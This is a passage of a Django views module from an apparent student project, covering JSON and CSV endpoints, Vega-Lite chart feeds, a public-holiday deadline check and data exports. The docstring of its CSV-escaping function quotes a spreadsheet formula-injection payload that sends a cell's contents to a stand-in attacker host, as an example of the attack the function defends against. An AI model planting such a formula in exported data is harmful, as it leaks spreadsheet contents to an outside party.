        "filters": {k: v for k, v in request.GET.items() if v},
        "results": [serialize_item(item) for item in items[:limit]],
    }
    # indent=2 only changes the whitespace; it makes the response readable when somebody
    # opens the endpoint in a browser, which is how most people first meet an API.
    return JsonResponse(payload, json_dumps_params={"indent": 2})


class ItemsApiView(LoginRequiredMixin, View):
    """
    CLASS-BASED version of the same endpoint, so the project shows both styles.

    Identical output; the difference is that a CBV can grow per-method behaviour (a post()
    for writes, a dispatch() for auth) without the function turning into a chain of ifs.
    """

    def get(self, request, *args, **kwargs):
        items = api_item_queryset(request.GET, request.user)
        return JsonResponse(
            {
                "count": items.count(),
                "style": "class-based view (django.views.View)",
                "results": [serialize_item(item) for item in items[:50]],
            },
            json_dumps_params={"indent": 2},
        )


@login_required
def api_insights(request):
    """
    The aggregations as JSON: the same numbers the charts are drawn from, so a client can plot
    them itself. Optional ?space=work narrows every figure to one space.
    """
    items = owned_items(request.user)
    space = request.GET.get("space")
    if space:
        if space not in SPACE_LABELS:
            return JsonResponse(
                {"error": f"unknown space {space!r}",
                 "allowed": list(SPACE_LABELS)}, status=400
            )
        items = items.filter(brief__space__kind__exact=space)

    by_lane = items.values("lane").annotate(total=Count("id")).order_by("-total")
    user_messages = owned_messages(request.user)
    by_provider = (
        user_messages.values("connection__provider")
        .annotate(total=Count("id"))
        .order_by("-total")
    )
    # Same shape, over time instead of over a category: one row per calendar day a message
    # arrived. TruncDate collapses the datetime column to its date so two messages on the same
    # day land in the same GROUP BY bucket regardless of time-of-day. Unfiltered by ?space=,
    # same as messages_by_provider above -- Message has no direct space column to filter on.
    by_day = (
        user_messages.annotate(day=TruncDate("sent_at"))
        .values("day")
        .annotate(total=Count("id"))
        .order_by("day")
    )
    return JsonResponse(
        {
            "space": space or "all",
            "totals": {
                "items": items.count(),
                "messages": user_messages.count(),
                "briefs": owned_briefs(request.user).count(),
                "people": owned_people(request.user).count(),
            },
            "items_by_lane": [
                {"lane": row["lane"], "label": LANE_LABELS.get(row["lane"], row["lane"]),
                 "total": row["total"]}
                for row in by_lane
            ],
            "messages_by_provider": [
                {"provider": row["connection__provider"],
                 "label": PROVIDER_LABELS.get(row["connection__provider"], ""),
                 "total": row["total"]}
                for row in by_provider
            ],
            # One {date, total} point per day, already sorted. The Vega-Lite charts read the
            # flat, chart-ready feeds further down (/api/insights/items-by-lane/ and
            # /api/insights/messages-by-hour/) rather than digging into this nested object.
            "messages_by_day": [
                {"date": row["day"].isoformat(), "total": row["total"]}
                for row in by_day
            ],
        },
        json_dumps_params={"indent": 2},
    )


@login_required
def api_items_text(request):
    """
    The SAME data as /api/items/, returned with HttpResponse instead of JsonResponse, so the
    difference can actually be observed rather than just described:

        /api/items/      JsonResponse   -> Content-Type: application/json
                                           browsers and fetch() parse it as data; Django
                                           serializes the dict for you and refuses non-dicts
                                           unless safe=False.

        /api/items.txt   HttpResponse   -> Content-Type: text/plain (what we pass), and with
                                           no content_type at all it would be text/html, i.e.
                                           the browser would try to render JSON as a document.
                                           HttpResponse never serializes anything: the body
                                           has to be a string or bytes we built ourselves.

        /api/items.csv   HttpResponse   -> Content-Type: text/csv, which is what makes a
                                           browser offer to download the file instead of
                                           showing it. Same rows, third MIME type.

    Check it with:  curl -sI http://127.0.0.1:8000/api/items/ | grep -i content-type
    """
    items = api_item_queryset(request.GET, request.user)[:50]
    body = json.dumps(
        {"count": len(items), "results": [serialize_item(i) for i in items]}, indent=2
    )
    return HttpResponse(body, content_type="text/plain; charset=utf-8")


@login_required
def api_items_csv(request):
    """The same rows again as CSV, the third MIME type. See api_items_text for the comparison."""
    items = api_item_queryset(request.GET, request.user)[:200]
    buffer = io.StringIO()
    writer = csv.writer(buffer)
    writer.writerow(["id", "title", "lane", "rank", "state", "space", "url"])
    for item in items:
        # csv_safe() on the one free-text cell, for exactly the reason its docstring gives.
        # This endpoint and /export/brief-items.csv both answer text/csv with an attachment
        # disposition, so both produce a file that Excel and Sheets open and both evaluate a
        # leading =, +, -, @, tab or CR as a formula. The export was defended and this one was
        # not, which is the way a defence usually fails: not removed, just not copied to the
        # sibling that grew up next to it. CsvInjectionTests now asserts both.
        writer.writerow([item.pk, csv_safe(item.title), item.lane, item.rank, item.state,
                         item.brief.space.kind, item.get_absolute_url()])
    response = HttpResponse(buffer.getvalue(), content_type="text/csv")
    response["Content-Disposition"] = 'attachment; filename="unopsis-items.csv"'
    return response


# ======================================================================================
# ASSIGNMENT 4, PART 1 -- VEGA-LITE: chart-ready feeds, the specs, one endpoint per chart
# ======================================================================================
# The two feeds below are the "internal API for charts": GET-only, database-backed, and
# returned as a BARE JSON ARRAY of flat records -- the shape Vega-Lite reads with nothing but
# {"data": {"url": ...}}. /api/insights/ already carries the same numbers, but nested inside an
# object, which would make every chart (and every classmate pasting the URL into the Vega-Lite
# editor) add a "format": {"property": ...} clause to dig them out.
#
# The specs themselves are files, unopsis/vega_lite/*.vl.json, so they can be submitted, opened
# in the Vega-Lite editor and reviewed in a diff. Every chart output is built from those files:
#
#     /vega-lite/chart1/       the chart embedded in its own HTML page (vega-embed, in the browser)
#     /vega-lite/chart1.json   the spec, with data.url made absolute so it works pasted elsewhere
#     /vega-lite/chart1.png    the same spec rendered to a PNG on the server (vl-convert)

VEGA_LITE_DIR = Path(__file__).resolve().parent / "vega_lite"


def items_by_lane_rows():
    """
    Chart 1's data: one {lane, label, total} record per lane, in the product's lane order.

    Every lane is listed even when it is empty, so the bar chart always shows the same three
    bars and an empty lane reads as a zero rather than disappearing.
    """
    counts = {
        row["lane"]: row["total"]
        for row in BriefItem.objects.values("lane").annotate(total=Count("id"))
    }
    return [
        {"lane": lane, "label": label, "total": counts.get(lane, 0)}
        for lane, label in BriefItem.Lane.choices
    ]


def messages_by_hour_rows(user):
    """
    Chart 2's data: one {hour, total} record per hour from the first message to the last,
    over the messages `user` owns.

    Scoped, unlike items_by_lane_rows() above it, and the difference is the whole of the
    "which feed may be published" decision. This one is an hour-by-hour record of when one
    person's messages arrive, which is also a record of when they sleep, when they work and
    when they were away. Counts about a person are still about a person.

    TruncHour is the GROUP BY bucket. Hours with no messages are filled in as zero here,
    because a line drawn only through the busy hours would join them with a straight segment
    and imply traffic in between that never happened.
    """
    counts = {
        row["hour"]: row["total"]
        for row in owned_messages(user)
        .annotate(hour=TruncHour("sent_at"))
        .values("hour")
        .annotate(total=Count("id"))
    }
    if not counts:
        return []
    rows = []
    hour, last = min(counts), max(counts)
    while hour <= last:
        rows.append({"hour": hour.isoformat(), "total": counts.get(hour, 0)})
        hour += timedelta(hours=1)
    return rows


def api_items_by_lane(request):
    """
    GET /api/insights/items-by-lane/ -- chart 1's feed, a bare array (hence safe=False).

    THE ONE PUBLIC API. Every other endpoint in this file gained @login_required or
    LoginRequiredMixin in Assignment 5; this one deliberately did not, and the missing
    decorator is the feature, so please do not "fix" it. Assignment 5 Part 3 asks for exactly
    one endpoint that a classmate, a Vega-Lite spec or a Python script can read with no
    account, and this is it.

    It is safe to leave open because of WHAT it answers, not because of who asks. The whole
    response is three rows of {lane, label, total}: aggregate counts, plus labels that come
    from BriefItem.Lane.choices in code rather than from the database. No title, no summary,
    no message body, no person, no handle, no timestamp. A reader learns how many items sit
    in each lane and nothing whatsoever about any of them.

    Note what was NOT made public alongside it, because both look equally harmless and are
    not. /api/insights/ carries the same counts plus a day-by-day activity timeline and the
    list of providers the user has connected; /api/insights/messages-by-hour/ is an
    hour-by-hour record of when one person's messages arrive, which also says when they sleep.
    Counts about a person are still about a person. Both are protected.

    unopsis/middleware.py adds Access-Control-Allow-Origin: * here, which is what lets the
    Vega-Lite editor at vega.github.io read it cross-origin.

    What is built on this URL, so that changing its SHAPE is understood to be a breaking
    change rather than a refactor: docs/a5/vega_lite_chart.txt (the submitted chart spec,
    which encodes the field names `label`, `total` and `lane` by name) and the three
    programs in docs/a5/alternative_uses/. The response is a bare ARRAY on purpose -- wrap
    it in an object one day and every one of those needs editing, and the Vega-Lite chart
    in particular would fail by silently rendering empty. PublicApiSubmissionTests in
    tests.py reads those files and checks them against this view on every run.
    """
    return JsonResponse(items_by_lane_rows(), safe=False, json_dumps_params={"indent": 2})


@login_required
def api_messages_by_hour(request):
    """GET /api/insights/messages-by-hour/ -- chart 2's feed, a bare array (hence safe=False)."""
    return JsonResponse(
        messages_by_hour_rows(request.user), safe=False, json_dumps_params={"indent": 2}
    )


# One entry per chart. `rows` is the same function its data URL serves, so the server-rendered
# PNG and the browser-rendered chart can never be drawn from different numbers.
#
# Every entry takes the REQUEST, even chart 1 whose rows do not depend on it. A uniform
# signature is what lets vega_chart_png() call config["rows"](request) without knowing which
# chart it is holding -- and the day a third chart is added, the only way to write it is the
# way that gets the scoping right, because there is no zero-argument form to reach for.
VEGA_CHARTS = {
    "chart1": {
        "spec_file": "chart1_items_by_lane.vl.json",
        "rows": lambda request: items_by_lane_rows(),
        "kind": "Bar chart",
        "title": "Brief items by lane",
        "caption": "One bar per lane, from a GROUP BY lane over BriefItem.",
    },
    "chart2": {
        "spec_file": "chart2_messages_by_hour.vl.json",
        "rows": lambda request: messages_by_hour_rows(request.user),
        "kind": "Line chart",
        "title": "Messages received per hour",
        "caption": "Message rows bucketed with TruncHour(sent_at), empty hours drawn as zero.",
    },
}


def _vega_chart(chart):
    """The registry entry for `chart`, or a 404 for a name that is not one of ours."""
    try:
        return VEGA_CHARTS[chart]
    except KeyError:
        raise Http404(f"No Vega-Lite chart called {chart!r}")


def _load_spec(chart):
    """Read the chart's .vl.json file fresh on every call, so an edited spec needs no restart."""
    path = VEGA_LITE_DIR / _vega_chart(chart)["spec_file"]
    return json.loads(path.read_text(encoding="utf-8"))


@login_required
def vega_chart_spec(request, chart):
    """
    GET /vega-lite/<chart>.json -- the spec, ready to paste into the Vega-Lite editor.

    The file stores data.url as a path ("/api/insights/items-by-lane/") so it works on any
    host. Here it is made absolute against the host that served it, because a spec opened in
    the editor at vega.github.io would otherwise resolve that path against vega.github.io.
    """
    spec = _load_spec(chart)
    spec["data"]["url"] = request.build_absolute_uri(spec["data"]["url"])
    return JsonResponse(spec, json_dumps_params={"indent": 2})


@login_required
def vega_chart_page(request, chart):
    """GET /vega-lite/<chart>/ -- one chart, embedded on a page of its own."""
    config = _vega_chart(chart)
    return render(
        request,
        "unopsis/vega_chart.html",
        {
            "chart": chart,
            "config": config,
            "spec_file": f"unopsis/vega_lite/{config['spec_file']}",
            "charts": VEGA_CHARTS,
        },
    )


@login_required
def vega_chart_png(request, chart):
    """
    GET /vega-lite/<chart>.png -- the Vega-Lite spec rendered to an image on the server.

    vl-convert runs the real Vega-Lite compiler and renderer in-process, so this is the same
    chart the browser draws, not a matplotlib look-alike. The one change made before rendering
    is to hand it the rows directly instead of the URL: the renderer runs inside this request
    and cannot fetch a relative path, and calling our own site over HTTP from inside a request
    would be slow and, on a free PythonAnywhere account, blocked. The rows come from the same
    function the data URL serves, so the numbers are identical.
    """
    config = _vega_chart(chart)
    spec = _load_spec(chart)
    spec["data"] = {"values": config["rows"](request)}
    png = vl_convert.vegalite_to_png(spec, scale=2)
    response = HttpResponse(png, content_type="image/png")
    response["Content-Length"] = str(len(png))
    # Live data, like the matplotlib PNGs: the browser must not keep an old chart.
    response["Cache-Control"] = "no-store"
    return response


# ======================================================================================
# ASSIGNMENT 4, PART 2 -- EXTERNAL API: will any open deadline land on a day off?
# ======================================================================================
# The external service is Nager.Date (https://date.nager.at): keyless, no signup, and -- the
# reason it was picked over the alternatives -- on PythonAnywhere's allow-list, which is the
# only set of sites a free PythonAnywhere account can call out to.
#
# Triangulation: our own deadlines (BriefItem.deadline_at) are checked against two of its
# endpoints -- the public holidays and the long weekends -- and the analysis is computed per
# request. Nothing Nager.Date returns is ever written to a model.

NAGER_DATE_BASE_URL = "https://date.nager.at/api/v3"

# How many bridge days (a working day you would take off to join a holiday to a weekend) the
# long-weekend lookup may assume, when ?bridge_days= is not given, and the most it accepts.
DEFAULT_BRIDGE_DAYS = 1
MAX_BRIDGE_DAYS = 5


def _nager_get(path, params=None):
    """
    The one place this project calls Nager.Date.

    requests.get() is given the query string as params= (requests encodes it, so nothing is
    glued into the URL by hand) and timeout=5, so a slow service costs a visitor five seconds
    at most instead of hanging the worker. Two kinds of failure come out:

      * ValueError for a 404, which is Nager.Date's answer to a country code it does not know;
      * requests.exceptions.RequestException for everything network-shaped -- DNS failure,
        refused connection, timeout, and (via raise_for_status) any other 4xx/5xx status.
    """
    response = requests.get(f"{NAGER_DATE_BASE_URL}/{path}", params=params, timeout=5)
    if response.status_code == 404:
        raise ValueError("Nager.Date has no data for that country code")
    response.raise_for_status()
    return response.json()


def _fetch_holidays(year, country):
    """{date: holiday name} for one year of one country's public holidays."""
    rows = _nager_get(f"PublicHolidays/{year}/{country}")
    return {date.fromisoformat(row["date"]): row["localName"] for row in rows}


def _fetch_long_weekends(year, country, bridge_days):
    """
    One year of long weekends, as [{"start", "end", "day_count", "bridge_days"}].

    availableBridgeDays is a real query parameter on this endpoint, so it goes through
    params=: with 1, a Thursday holiday plus a Friday off counts as a four-day weekend.
    """
    rows = _nager_get(
        f"LongWeekend/{year}/{country}", params={"availableBridgeDays": bridge_days}
    )
    return [
        {
            "start": date.fromisoformat(row["startDate"]),
            "end": date.fromisoformat(row["endDate"]),
            "day_count": row["dayCount"],
            "bridge_days": [date.fromisoformat(day) for day in row.get("bridgeDays") or []],
        }
        for row in rows
    ]


def _is_working_day(day, holidays):
    """Monday-to-Friday and not a public holiday. (A Saturday/Sunday weekend is assumed.)"""
    return day.weekday() < 5 and day not in holidays


def _next_working_day(day, holidays):
    """The deadline day itself if it is a working day, else the first working day after it."""
    while not _is_working_day(day, holidays):
        day += timedelta(days=1)
    return day


def analyse_deadline(deadline_day, today, holidays, long_weekends):
    """
    Everything the external calendar says about one deadline, as a JSON-ready dict.

    `at_risk` is the headline: a deadline that falls on a weekend, a public holiday or inside
    a long weekend is one the people involved are likely to be away for, so it should be
    raised before it arrives rather than discovered on the day.
    """
    holiday_name = holidays.get(deadline_day)
    long_weekend = next(
        (lw for lw in long_weekends if lw["start"] <= deadline_day <= lw["end"]), None
    )
    is_weekend = deadline_day.weekday() >= 5
    nearest = (
        min(holidays, key=lambda day: (abs((day - deadline_day).days), day)) if holidays else None
    )
    next_working = _next_working_day(deadline_day, holidays)
    return {
        "deadline_date": deadline_day.isoformat(),
        "weekday": deadline_day.strftime("%A"),
        "days_until_deadline": (deadline_day - today).days,
        "is_weekend": is_weekend,
        "is_holiday": holiday_name is not None,
        "holiday_name": holiday_name,
        "in_long_weekend": long_weekend is not None,
        "long_weekend": (
            {"start": long_weekend["start"].isoformat(),
             "end": long_weekend["end"].isoformat(),
             "day_count": long_weekend["day_count"]}
            if long_weekend else None
        ),
        "is_bridge_day": bool(long_weekend) and deadline_day in long_weekend["bridge_days"],
        "nearest_holiday": (
            {"date": nearest.isoformat(), "name": holidays[nearest],
             "days_from_deadline": (nearest - deadline_day).days}
            if nearest else None
        ),
        "next_working_day": next_working.isoformat(),
        "working_days_lost": (next_working - deadline_day).days,
        "at_risk": is_weekend or holiday_name is not None or long_weekend is not None,
    }


@login_required
def deadline_holidays(request):
    """
    GET /api/deadlines/holidays/?country=US&bridge_days=1

    Takes the open deadlines in our database, fetches the matching years of public holidays and
    long weekends from Nager.Date, and returns, for each deadline, whether it lands on a day
    off, the nearest holiday, and the next working day -- plus a summary across all of them.

    Query parameters:
        country       two-letter country code (default US)
        bridge_days   0-5 bridge days allowed when finding long weekends (default 1)

    Errors come back as JSON with an "error" key: 400 for bad input or an unknown country,
    502 when Nager.Date cannot be reached or answers with an error.
    """
    country = request.GET.get("country", "US").strip().upper()
    if not country.isalpha() or len(country) != 2:
        return JsonResponse(
            {"error": f"country must be a two-letter code, got {country!r}"}, status=400
        )
    try:
        bridge_days = int(request.GET.get("bridge_days", DEFAULT_BRIDGE_DAYS))
    except ValueError:
        bridge_days = -1
    if not 0 <= bridge_days <= MAX_BRIDGE_DAYS:
        return JsonResponse(
            {"error": f"bridge_days must be a whole number from 0 to {MAX_BRIDGE_DAYS}"},
            status=400,
        )

    items = list(
        owned_items(request.user)
        .filter(state=BriefItem.State.OPEN, deadline_at__isnull=False)
        .select_related("brief__space")
        .order_by("deadline_at")
    )
    today = timezone.localdate()
    envelope = {"country": country, "bridge_days": bridge_days}
    if not items:
        # Nothing to check, so nothing is fetched: no external call for an empty answer.
        return JsonResponse(
            {**envelope, "years_checked": [], "count": 0,
             "summary": {"deadlines_checked": 0, "at_risk": 0}, "results": []},
            json_dumps_params={"indent": 2},
        )

    # One calendar per year actually in use (plus this year, for "next holiday"), not one
    # per deadline: a dozen deadlines in the same year share the same two external calls.
    deadline_days = {item.pk: timezone.localtime(item.deadline_at).date() for item in items}
    years = sorted({day.year for day in deadline_days.values()} | {today.year})
    holidays, long_weekends = {}, []
    try:
        for year in years:
            holidays.update(_fetch_holidays(year, country))
            long_weekends.extend(_fetch_long_weekends(year, country, bridge_days))
    except ValueError as exc:
        return JsonResponse({"error": str(exc), "country": country}, status=400)
    except requests.exceptions.RequestException as exc:
        return JsonResponse(
            {"error": "could not reach the public holiday service", "detail": str(exc)},
            status=502,
        )

    results = []
    for item in items:
        results.append({
            "id": item.pk,
            "title": item.title,
            "space": item.brief.space.kind,
            "deadline_at": item.deadline_at.isoformat(),
            **analyse_deadline(deadline_days[item.pk], today, holidays, long_weekends),
            "url": item.get_absolute_url(),
        })

    upcoming = sorted(day for day in holidays if day >= today)
    at_risk = [row for row in results if row["at_risk"]]
    summary = {
        "deadlines_checked": len(results),
        "on_public_holiday": sum(row["is_holiday"] for row in results),
        "on_weekend": sum(row["is_weekend"] for row in results),
        "in_long_weekend": sum(row["in_long_weekend"] for row in results),
        "at_risk": len(at_risk),
        "share_at_risk": round(len(at_risk) / len(results), 2),
        "overdue": sum(row["days_until_deadline"] < 0 for row in results),
        "next_holiday": (
            {"date": upcoming[0].isoformat(), "name": holidays[upcoming[0]],
             "days_from_today": (upcoming[0] - today).days}
            if upcoming else None
        ),
        "holidays_in_checked_years": len(holidays),
        "long_weekends_in_checked_years": len(long_weekends),
    }
    return JsonResponse(
        {**envelope, "years_checked": years, "count": len(results),
         "summary": summary, "results": results},
        json_dumps_params={"indent": 2},
    )


# ======================================================================================
# ASSIGNMENT 4, PART 3 -- CSV AND JSON EXPORT + THE REPORTS PAGE
# ======================================================================================
# Everything below is additive. The Assignment-3 trio (/api/items.txt, /api/items.csv,
# /api/items/) stays exactly as it was: its job is to show the SAME rows through three MIME
# types, it is capped and reshaped by query parameters, and a test pins its headers. An
# export is a different promise -- a whole, unfiltered, timestamped snapshot of one model
# that a person saves to disk -- so it gets its own queryset, its own routes and its own
# filenames rather than being bolted onto the demo endpoint.
#
# The exported model is BriefItem. CSV and JSON are deliberately built from ONE queryset and
# ONE row serializer, so the two downloads provably contain the same records in the same
# order; a reader can diff them.

# The export's column order, written out rather than taken from dict ordering, because the
# header row of a CSV is a contract: a spreadsheet somebody built on column D must not have
# column D change meaning the next time a field is added to serialize_item().
EXPORT_COLUMNS = [
    "id",
    "title",
    "lane",
    "lane_label",
    "rank",
    "state",
    "summary",
    "space",
    "brief_id",
    "deadline_at",
    "receipt_count",
    "url",
]


def export_item_queryset(user):
    """
    The rows both exports contain, in the order both exports write them -- `user`'s rows.

    "A snapshot of the whole table" below means the whole of what the person asking owns, not
    the whole table. An export is the single highest-volume read in the project (every title,
    every summary, every deadline, in one file, with no slice), so it is the call site where
    an unscoped queryset costs the most and shows the least.

    No query parameters and no slice: an export is a snapshot of the whole table, not a
    filtered feed, which is the difference between this and api_item_queryset(). The ordering
    is the product's reading order (Needs-you -> Moving -> FYI, then rank) with the primary
    key last as a tie-breaker, so two exports taken a second apart over an unchanged database
    come out byte-identical apart from the timestamp. select_related/annotate are here so the
    serializer does not fire one extra query per row.
    """
    return (
        owned_items(user)
        .select_related("brief__space")
        .annotate(receipt_count=Count("messages"))
        .annotate(lane_priority=LANE_PRIORITY)
        .order_by("lane_priority", "rank", "pk")
    )


def export_filename(extension):
    """
    Build "brief_items_2026-10-05_14-30.<ext>" for the Content-Disposition header.

    Timestamped on purpose: a download called brief_items.csv overwrites yesterday's
    brief_items.csv in the Downloads folder, and then nobody can say which snapshot they are
    looking at. localtime() rather than now() because the stamp is read by a human in this
    timezone, not compared by a machine -- the ISO instant for that lives in the JSON body's
    generated_at field.
    """
    return f"brief_items_{timezone.localtime().strftime('%Y-%m-%d_%H-%M')}.{extension}"


# Characters that make a spreadsheet treat a cell as a formula rather than as text.
# TAB and CR are in the list because Excel strips leading whitespace before deciding, so
# "\t=cmd|..." reaches the formula parser exactly as "=cmd|..." would.
FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value):
    """
    Neutralise a value that a spreadsheet would otherwise run as a formula.

    The attack this closes is CSV injection, and the path is real in this project rather than
    theoretical: the create form on /briefs/<pk>/ takes a free-text title, so a user can store

        =HYPERLINK("http://evil.example/leak?c="&A1,"Click for your refund")

    as an item title. Nothing happens on the website -- Django escapes it on the page. It goes
    off when a teammate downloads this export and opens it in Excel or Sheets, which parse a
    leading =, +, -, @, tab or carriage return as the start of a formula. Quoting does not help:
    Excel strips the CSV quotes first and evaluates what is inside. Depending on the version
    that is a link that exfiltrates a neighbouring cell, a WEBSERVICE() call, or a DDE command.

    Assignment 5 narrowed who can plant that string -- /briefs/<pk>/ now requires a login, so
    it takes an account rather than a passing stranger -- but it did not close the hole, and
    this function stays exactly as it was. Authentication answers "who are you", not "is what
    you typed safe to hand to Excel". Signing in is free (the sign-up page is public, as it
    has to be), accounts get shared, and the person who opens the downloaded file is a
    teammate who trusts it because it came from our own site.

    The fix is the standard one: prefix the value with an apostrophe, which every spreadsheet
    reads as "the rest of this cell is text". The apostrophe is not part of the value and is not
    displayed in the cell, though it IS a byte in the file, which is why the JSON export does
    not do this -- JSON has no formula evaluator, so there is nothing to defend against and
    mangling the data would be pure loss.
    """
    if isinstance(value, str) and value.startswith(FORMULA_TRIGGERS):
        return "'" + value
    return value


@login_required
def export_items_csv(request):
    """
    PART 3, CSV EXPORT: every BriefItem as a downloadable spreadsheet.

    Three things make this a download rather than a page:
      * content_type="text/csv" tells the browser what the bytes are;
      * Content-Disposition: attachment makes it save instead of display;
      * filename="..." names the saved file, and ours carries the timestamp.

    The first row written is the header row, so the file opens in Excel or Sheets with
    labelled columns instead of anonymous ones.
    """
    buffer = io.StringIO()
    writer = csv.writer(buffer)
    writer.writerow(EXPORT_COLUMNS)
    for item in export_item_queryset(request.user):
        record = serialize_item(item)
        # Indexing EXPORT_COLUMNS rather than record.values() is what keeps every row aligned
        # with the header no matter what order the serializer builds its dict in.
        writer.writerow([csv_safe(record[column]) for column in EXPORT_COLUMNS])

    response = HttpResponse(buffer.getvalue(), content_type="text/csv")
    response["Content-Disposition"] = f'attachment; filename="{export_filename("csv")}"'
    return response


@login_required
def export_items_json(request):
    """
    PART 3, JSON EXPORT: the same model, the same rows, the same order, as pretty JSON.

    The payload is an OBJECT wrapping the list, not a bare array, because an export has to
    describe itself once it is sitting in somebody's Downloads folder:

        generated_at   when this file was produced, ISO 8601 with the offset. Note this is
                       the RESPONSE's wall clock, not Brief.generated_at (models.py) -- that
                       column says when a brief was assembled, which is a fact about the data;
                       this says when the snapshot was taken, which is a fact about the file.
        record_count   how many records the file claims to hold, so a truncated download is
                       detectable by counting.
        brief_items    the records themselves, under a key named for the model.

    json_dumps_params={"indent": 2} only changes whitespace, but it is the difference between
    a file a human can read in a text editor and one wall of characters.
    """
    items = list(export_item_queryset(request.user))
    payload = {
        "generated_at": timezone.now().isoformat(),
        "record_count": len(items),
        "brief_items": [serialize_item(item) for item in items],
    }
    response = JsonResponse(payload, json_dumps_params={"indent": 2})
    # JsonResponse alone would make the browser display the JSON. The attachment disposition
    # is what turns the same bytes into a saved file, exactly as it does for the CSV above.
    response["Content-Disposition"] = f'attachment; filename="{export_filename("json")}"'
    return response


@login_required
def reports(request):
    """
    PART 3, THE REPORTS PAGE: the printable read of the database, and the page the two
    exports are launched from.

    It reuses aggregate_summaries() rather than re-querying, so the numbers here can never
    drift from the ones on /insights/ -- one helper, one definition of "items per lane". The
    page's own job is presentation: the grouped tables, one totals line, and the two download
    buttons, which is the only place in the project where an export is reachable by clicking.
    """
    return render(
        request,
        "unopsis/reports.html",
        {
            "summaries": aggregate_summaries(request.user),
            # The same count the JSON export will report, shown on the buttons so somebody
            # knows how big the download is before they ask for it.
            "export_count": export_item_queryset(request.user).count(),
            "generated_at": timezone.localtime(),
        },
    )
